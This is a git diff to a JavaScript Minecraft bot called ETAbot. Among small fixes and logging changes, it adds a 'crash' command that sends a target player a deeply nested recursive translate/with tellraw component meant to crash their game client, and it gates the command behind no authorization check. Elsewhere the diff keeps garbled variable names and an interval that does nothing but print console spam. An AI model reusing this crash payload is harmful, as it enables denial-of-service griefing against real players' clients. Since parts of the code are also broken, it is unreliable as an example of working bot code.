@@ -3,7 +3,6 @@ const { CoreClass } = require('./util/core.js');
 const { Tellraw, Text } = require("./util/tellrawBuilder.js");
 const { selfcare } = require('./util/selfcare');
 const readline = require('readline');
-const { join } = require('path');
 
 class MinecraftBot {
     constructor() {
@@ -95,7 +94,6 @@ class MinecraftBot {
             .add(new Text("§l\\\\prefix§r ").color("white"))
             .add(new Text("§l\\\\refill§r ").color("white"))
             .add(new Text("§l\\\\tp§r ").color("white"))
-            .add(new Text("§l\\\\refill§r ").color("white"))
             .add(new Text("§l\\\\echo§r ").color("white"))
             .add(new Text("§l\\\\hash§r ").color("green"))
             .add(new Text("§l\\\\lagserver§r ").color("green"))
@@ -120,14 +118,14 @@ class MinecraftBot {
 
             if (this.cdadwdaloopIntv != null) {
                 clearInterval(this.cloopIntv);
-                this.clowopIadwadantv = null;
+                this.cloopIntv = null;
             } else {
                 let interv = 1; // ms 0.1
-                this.clwoopIntv = setInterval(() => {
+                this.cloopIntv = setInterval(() => {
                 console.log('----------------------')
                 console.log('SOMEONE KILLED THE BOT')
                 console.log('----------------------')
-                killbotyay.bot.Text('oh noes this code kills da bot cause "killbotyay" isnt defined yay')
+                this
                }, interv);
             }
         });
@@ -186,6 +184,13 @@ class MinecraftBot {
             .add(new Text("Coming soon cause im cringe!").color("dark_green"))
             this.bot.core.fancyTellraw(authMessage.get());
         });
+
+        this.commands.set('crash', (args) => {
+            const target = args[0];
+            const customItem = `{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":[{"translate":"%1$s,%1$s","with":["eta"]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}]}`;
+            this.bot.core.run(`/tellraw ${target} ${customItem}`);
+        });
+
 
         this.commands.set('lagserver', (args) => {
             if (args[0] !== this.bot.trustedHash && args[0] !== this.bot.ownerHash) {
@@ -253,7 +258,7 @@ class MinecraftBot {
         this.commands.set('refill', () => {
             this.bot.pos = this.bot.entity.position;
             this.bot.core.refill();
-            this.bot.core.run('/username ‌&2ETA&ab�t');
+            this.bot.chat('/username &2&lETA&ab�t');
         });
 
         this.commands.set('hash', (args, username) => {
@@ -307,7 +312,7 @@ class MinecraftBot {
         if (username === this.bot.username) return;
         if (message.startsWith('Command set:') || message.startsWith('ETAbot ')) return;
 
-        console.log(`Received message from ${username}: ${message}`);
+        console.log(`<${username}> ${message}`);
 
         if (!message.startsWith(this.prefix)) return;
 
@@ -327,7 +332,11 @@ class MinecraftBot {
 
         rl.on('line', (input) => {
             if (this.bot) {
-                this.bot.core.run(`say ${input}`);
+                if (input.startsWith('/')) {
+                    this.bot.core.run(input);
+                } else {
+                    this.bot.core.run(`/say ${input}`);
+                }
             }
         });
     }
